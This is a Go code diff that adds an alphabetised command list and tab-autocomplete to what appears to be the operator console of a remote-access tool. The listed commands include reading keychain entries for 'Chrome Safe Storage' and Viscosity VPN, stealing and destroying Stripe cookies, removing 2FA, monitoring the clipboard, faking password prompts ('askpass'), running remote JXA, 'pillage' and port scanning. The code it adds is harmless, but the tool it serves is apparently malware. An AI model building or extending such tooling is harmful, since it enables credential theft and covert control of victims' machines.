@@ -6,6 +6,7 @@ import (
 	"flag"
 	"fmt"
 	"net"
+	"sort"
 	"strings"
 	"time"
 
@@ -99,6 +100,49 @@ func main() {
 
 	serverAddress := serverIP + ":" + serverPort
 
+	// List of commands extracted from the case switches
+	commands := []string{
+		"askpass",
+		"cat",
+		"cd",
+		"clipboard",
+		"clipmon",
+		"clipmonstop",
+		"clipmonview",
+		"cp",
+		"curl",
+		"download",
+		"env",
+		"go-sc 2fa remove",
+		"go-sc 2fa",
+		"jxaremote",
+		"jobs",
+		"keychain",
+		"keychain Viscosity/1/ovpn",
+		"keychain Chrome Safe Storage",
+		"kill",
+		"ls",
+		"mv",
+		"pillage",
+		"ping",
+		"portscan",
+		"ps",
+		"pwd",
+		"remotejxa",
+		"rm",
+		"screenshot",
+		"stripe_2fa",
+		"stripe_cookie",
+		"stripe_cookie_destroy",
+		"stripe_cookie_stop",
+		"unsafe_jxa",
+		"upload",
+		"whoami",
+	}
+
+	// Sort the commands alphabetically
+	sort.Strings(commands)
+
 	client, err := NewClient(serverAddress)
 	if err != nil {
 		fmt.Println("Error connecting to server:", err)
@@ -114,6 +158,19 @@ func main() {
 		return
 	}
 	defer rl.Close()
+
+	// Set up autocomplete
+	rl.Config.AutoComplete = readline.NewPrefixCompleter(
+		readline.PcItemDynamic(func(prefix string) []string {
+			var items []string
+			for _, cmd := range commands {
+				if strings.HasPrefix(cmd, prefix) {
+					items = append(items, cmd)
+				}
+			}
+			return items
+		}),
+	)
 
 	for {
 		command, err := rl.Readline()
